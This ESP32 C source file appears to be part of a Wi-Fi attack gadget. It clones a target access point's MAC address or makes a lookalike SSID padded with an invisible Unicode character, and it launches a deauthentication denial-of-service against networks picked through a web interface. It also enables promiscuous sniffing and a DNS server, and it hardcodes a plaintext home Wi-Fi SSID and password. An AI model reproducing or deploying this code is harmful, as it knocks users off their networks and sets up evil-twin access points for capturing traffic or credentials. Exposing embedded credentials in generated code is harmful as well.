
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "wifi_handler.h"
#include "project_types.h"
#include <string.h>
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_mac.h"
#include "nvs_flash.h"
#include "lwip/inet.h" // For ip4_addr_t
#include "esp_timer.h"
#include "esp_wifi_types.h"
#include "wifi_controller.h"
#include "web_server.h"
#include "uart_deauth.h"
#include "dns_server.h"


static const char* TAG = "WIFI_HANDLER";
// static esp_timer_handle_t deauth_timer_handle;

// Your STA credentials
const char* sta_ssid = "SwathiWifo";
const char* sta_pass = "Password1234";

static attack_status_t attack_status = { .state = READY, .type = -1, .content_size = 0, .content = NULL };

struct HotspotConfig g_hotspotConfig = {
    .ssid = "ESP32_Control_AP",
    .bssid_str = "",
    .rssi = 0,
    .channel = 6,
    .hidden = false,
    .authmode = 1, // 1 = WPA2-PSK
    .authString = "WPA2-PSK",
    .password = "12345678"
};

static void wifi_event_handler(void* arg, esp_event_base_t event_base,
                               int32_t event_id, void* event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        esp_wifi_connect();
        ESP_LOGI(TAG, "STA mode started, connecting to %s...", sta_ssid);
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        ESP_LOGI(TAG, "Disconnected from STA network. Retrying...");
        esp_wifi_connect(); // Reconnect
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t* event = (wifi_event_ap_staconnected_t*) event_data;
        ESP_LOGI(TAG, "Station " MACSTR " joined, AID=%d",
                 MAC2STR(event->mac), event->aid);
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        wifi_event_ap_stadisconnected_t* event = (wifi_event_ap_stadisconnected_t*) event_data;
        ESP_LOGI(TAG, "Station " MACSTR " left, AID=%d",
                 MAC2STR(event->mac), event->aid);
    }
}

static void ip_event_handler(void* arg, esp_event_base_t event_base,
                             int32_t event_id, void* event_data)
{
    if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
        ESP_LOGI(TAG, "--- Got IP from home network! ---");
        ESP_LOGI(TAG, "--- http://" IPSTR, IP2STR(&event->ip_info.ip));
        ESP_LOGI(TAG, "---------------------------------");
    }
}
void attack_method_rogueap(const attack_config_t *attack_config, int mode)
{
    wifi_config_t ap_config = {0};
    const wifi_ap_record_t *ap_record = attack_config->ap_record;
    const char *password = attack_config->password;
    bool hidden = attack_config->hidden;

    ESP_LOGD(TAG, "Configuring Rogue AP");

    if (mode == 0) { // pure deauth
        ESP_LOGI(TAG, "Setting MAC address: %02X:%02X:%02X:%02X:%02X:%02X",
                 ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
                 ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
        wifictl_set_ap_mac((uint8_t *)ap_record->bssid);
    }

    char ssid_with_char[33];
    size_t src_len = strlen((char *)ap_record->ssid);

    if (mode != 0) {
        // U+3164 in UTF-8 is 3 bytes
        const char *u3164_utf8 = "\xE3\x85\xA4";
        // Ensure room for the 3-byte sequence and NUL (max SSID bytes = 32)
        if (src_len > 29) src_len = 29; // leave room for 3 bytes
        memcpy(ssid_with_char, ap_record->ssid, src_len);
        // append the 3-byte utf-8 char (safe copy)
        memcpy(ssid_with_char + src_len, u3164_utf8, 3);
        ssid_with_char[src_len + 3] = '\0';
    } else {
        // mode == 0: use SSID as-is (truncate to 32 bytes if necessary)
        if (src_len > 32) src_len = 32;
        memcpy(ssid_with_char, ap_record->ssid, src_len);
        ssid_with_char[src_len] = '\0';
    }

    memset(ap_config.ap.ssid, 0, sizeof(ap_config.ap.ssid));
    memcpy(ap_config.ap.ssid, ssid_with_char, strlen(ssid_with_char));
    ap_config.ap.ssid_len = (uint8_t)strlen(ssid_with_char);

    ap_config.ap.channel = ap_record->primary;
    ap_config.ap.max_connection = 4;
    ap_config.ap.ssid_hidden = hidden;

    if (ap_record->authmode == WIFI_AUTH_OPEN) {
        ap_config.ap.authmode = WIFI_AUTH_OPEN;
        memset(ap_config.ap.password, 0, sizeof(ap_config.ap.password));
    } else {
        ap_config.ap.authmode = ap_record->authmode;
        strncpy((char *)ap_config.ap.password, password, sizeof(ap_config.ap.password) - 1);
    }

    /* enforce password length for non-open networks */
    if (ap_config.ap.authmode != WIFI_AUTH_OPEN) {
        size_t pass_len = strlen((char *)ap_config.ap.password);
        if (pass_len < 8) {
            ESP_LOGW(TAG, "Password too short (%u chars) — using dummy password", (unsigned)pass_len);
            strncpy((char *)ap_config.ap.password, "12345678", sizeof(ap_config.ap.password) - 1);
        }
    }

    /* sanitize authmode for SoftAP */
    if (ap_config.ap.authmode == WIFI_AUTH_WEP || ap_config.ap.authmode >= WIFI_AUTH_MAX) {
        ESP_LOGW(TAG, "Invalid authmode %d for SoftAP; defaulting to WPA2_PSK", ap_config.ap.authmode);
        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    }

    wifictl_ap_start(&ap_config);

    ESP_LOGI(TAG, "AP started (SSID='%s', Channel %d, Hidden: %s, Authmode: %d)",
             ssid_with_char, ap_config.ap.channel, hidden ? "Yes" : "No", ap_config.ap.authmode);
}

static attack_dos_methods_t method = -1;

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    method = attack_config->method;
    ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            attack_method_rogueap(attack_config, 0);
            attack_method_broadcast(attack_config->ap_record, 1);
}


void attack_dos_stop() {
    attack_method_broadcast_stop();
    // wifictl_mgmt_ap_start();
    //         wifictl_restore_ap_mac();
    ESP_LOGI(TAG, "DoS attack stopped");
}

static void handle_deauth_request(void *handler_arg, esp_event_base_t event_base, int32_t event_id, void *event_data)
{
    if (event_base != WEB_EVENTS || event_id != WEB_EVENT_DEAUTH_REQUEST) {
        return;
    }

    attack_request_t *attack_request = (attack_request_t *) event_data;
    if (attack_request == NULL) {
        ESP_LOGE(TAG, "handle_deauth_request: NULL event_data");
        return;
    }

    attack_config_t attack_config = {
        .type = attack_request->type,
        .method = attack_request->method,
        .timeout = attack_request->timeout,
        .ap_record = NULL
    };

    const uint8_t *bssid_bytes = attack_request->bssid;

const wifi_ap_record_t *aprec = wifictl_find_ap_by_bssid(bssid_bytes);
if (aprec == NULL) {
    ESP_LOGE(TAG, "handle_deauth_request: could not find AP for BSSID %02X:%02X:%02X:%02X:%02X:%02X",
             bssid_bytes[0], bssid_bytes[1], bssid_bytes[2],
             bssid_bytes[3], bssid_bytes[4], bssid_bytes[5]);
    return;
}
if (aprec == NULL) {
    ESP_LOGE(TAG, "handle_deauth_request: could not find AP for BSSID %02X:%02X:%02X:%02X:%02X:%02X",
             attack_request->bssid[0], attack_request->bssid[1], attack_request->bssid[2],
             attack_request->bssid[3], attack_request->bssid[4], attack_request->bssid[5]);
    return;
}

attack_config.ap_record = aprec;
    if (attack_config.ap_record == NULL) {
        ESP_LOGE(TAG,
    "handle_deauth_request: invalid ap_record_id BSSID %02X:%02X:%02X:%02X:%02X:%02X",
    attack_request->bssid[0],
    attack_request->bssid[1],
    attack_request->bssid[2],
    attack_request->bssid[3],
    attack_request->bssid[4],
    attack_request->bssid[5]);
        return;
    }

    ESP_LOGI(TAG, "--- DEAUTH REQUEST RECEIVED ---");
    ESP_LOGI(TAG, "Target SSID: %s  channel: %d  auth: %d",
             attack_config.ap_record->ssid, attack_config.ap_record->primary, attack_config.ap_record->authmode);

    attack_dos_start(&attack_config);

    ESP_LOGI(TAG, "--- DEAUTH REQUEST HANDLED ---");
}



void start_hotspot(void)
{
    wifi_config_t ap_config = {
        .ap = {
            .channel = g_hotspotConfig.channel,
            .max_connection = 4,
            .ssid_hidden = g_hotspotConfig.hidden,
        },
    };

    strncpy((char*)ap_config.ap.ssid, g_hotspotConfig.ssid, 32);
    ap_config.ap.ssid_len = strlen(g_hotspotConfig.ssid);

    if (g_hotspotConfig.authmode == 0) { 
        ap_config.ap.authmode = WIFI_AUTH_OPEN;
        memset(ap_config.ap.password, 0, 64); 
    } else { 
        ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
        strncpy((char*)ap_config.ap.password, g_hotspotConfig.password, 64);
    }
    
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    
    ESP_LOGI(TAG, "Hotspot configuration set to SSID: %s", g_hotspotConfig.ssid);
    
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, mac);
    snprintf(g_hotspotConfig.bssid_str, sizeof(g_hotspotConfig.bssid_str),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    ESP_LOGI(TAG, " (Password: %s, Channel: %d, Hidden: %s, Auth: %s)",
           (g_hotspotConfig.authmode == 0 ? "(none)" : g_hotspotConfig.password),
           g_hotspotConfig.channel,
           g_hotspotConfig.hidden ? "Yes" : "No",
           g_hotspotConfig.authString);
           
    esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (ap_netif) {
        esp_netif_ip_info_t ip_info;
        esp_netif_get_ip_info(ap_netif, &ip_info);
        ESP_LOGI(TAG, "AP IP: " IPSTR, IP2STR(&ip_info.ip));
    }
}


void wifi_init_ap_sta(void)
{
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_ERROR_CHECK(esp_netif_init());

    ret = esp_event_loop_create_default();
    if (ret != ESP_OK && ret != ESP_ERR_INVALID_STATE) {
        ESP_ERROR_CHECK(ret);
    }

    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL));
    ESP_ERROR_CHECK(esp_event_handler_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &ip_event_handler, NULL));
    ESP_ERROR_CHECK(esp_event_handler_register(WEB_EVENTS, WEB_EVENT_DEAUTH_REQUEST, handle_deauth_request, NULL));

    wifi_config_t sta_config = {
        .sta = { /* .ssid and .password are set below */ },
    };
    strncpy((char*)sta_config.sta.ssid, sta_ssid, 32);
    strncpy((char*)sta_config.sta.password, sta_pass, 64);

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
    
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &sta_config));

    ESP_ERROR_CHECK(esp_wifi_start());

    start_dns_server("192.168.4.1");

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    ESP_LOGI(TAG, "WiFi initialized in STA mode, connected to home network");
}


const char* get_auth_mode_name(uint8_t authmode)
{
    switch (authmode) {
        case WIFI_AUTH_OPEN: return "Open";
        case WIFI_AUTH_WEP: return "WEP";
        case WIFI_AUTH_WPA_PSK: return "WPA-PSK";
        case WIFI_AUTH_WPA2_PSK: return "WPA2-PSK";
        case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2-PSK";
        case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-Enterprise";
        default: return "Unknown";
    }
}
